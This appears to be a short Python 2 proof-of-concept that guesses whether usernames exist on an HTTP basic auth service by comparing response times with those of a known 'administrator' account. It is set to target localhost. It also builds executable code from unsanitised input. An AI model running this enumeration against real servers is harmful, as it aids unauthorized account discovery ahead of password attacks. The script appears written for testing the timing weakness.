#!/usr/bin/python
import sys
import timeit
import numpy

# this script, attempts to use the timing variation in real users and nonuser 
# inputs to an http basic auth interface.

# The premise is, find an oracle (in this case we use Administrator) and use the 
# Aggregate response time as the baseline.  We create an example administrator
# user for the purposes of this test.

# The script currently takes a single input ala: './basicauth.py username'


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

target="localhost"
username=sys.argv[1]
oracle="administrator"
password="testa"
verbose=True
loops=75

def normalize( runs ):
	elem = numpy.array(runs)
	meant = numpy.mean(elem, axis=0)
	sdt = numpy.std(elem, axis=0)

	final_list2 = [x for x in runs if (x > meant - 1.97 * sdt)]
	normal = [x for x in final_list2 if (x < meant + 1.97 * sdt)]
	return normal

def checkuser( oracleuser, targetuser, target, loops ):
	oraclereq="""import requests
url = 'http://"""+target+"""'
r = requests.get(url, auth=('""" + oracleuser + """','password'))"""
	targetreq="""import requests
url= 'http://"""+target+"""'
r = requests.get(url, auth=('""" + targetuser + """','password'))"""
	oraclerun=[]
	targetrun=[]
	for x in range(0,loops):
		targetrun.append(timeit.timeit(targetreq,number=1))
		oraclerun.append(timeit.timeit(oraclereq,number=1))
	targetrun=normalize(targetrun)
	oraclerun=normalize(oraclerun)
	if(verbose): sys.stdout.write("ORACLE/TARGET:"+str(numpy.mean(oraclerun))+"/"+str(numpy.mean(targetrun))+"|")
	return (numpy.mean(oraclerun) <= numpy.mean(targetrun))

if checkuser(oracle, username, target, loops):
	print bcolors.OKGREEN + username + bcolors.ENDC+" : could exist"
else:
	print bcolors.FAIL + username + bcolors.ENDC+" : doesn't exist"
